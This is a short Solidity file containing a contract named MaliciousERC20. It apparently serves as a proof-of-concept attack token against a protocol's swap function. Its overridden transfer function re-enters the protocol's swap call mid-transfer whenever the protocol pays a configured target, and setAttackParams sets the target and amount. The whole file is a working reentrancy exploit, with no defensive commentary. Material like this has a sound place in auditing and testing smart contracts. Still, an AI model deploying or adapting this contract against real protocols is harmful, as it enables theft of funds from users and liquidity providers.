// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MaliciousERC20 is ERC20 {
    address public target;
    address public upsideProtocol;
    uint256 public attackAmount;
    
    constructor() ERC20("Evil", "EVIL") {
        _mint(msg.sender, 1000000 * 10**decimals());
    }
    
    function setAttackParams(address _target, address _upsideProtocol, uint256 _amount) external {
        target = _target;
        upsideProtocol = _upsideProtocol;
        attackAmount = _amount;
    }
    
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        // Only reenter on specific transfers to target
        if (to == target && msg.sender == upsideProtocol) {
            // Call back into swap during transfer
            bytes memory swapCall = abi.encodeWithSignature(
                "swap(address,bool,uint256,uint256,address)",
                address(this), // metaCoinAddress
                true,         // isBuy
                attackAmount, // tokenAmount
                0,           // minimumOut
                msg.sender   // recipient
            );
            (bool success,) = upsideProtocol.call(swapCall);
            require(success, "Reentrant call failed");
        }
        return super.transfer(to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        // Add similar reentrancy logic here if needed
        return super.transferFrom(from, to, amount);
    }
}
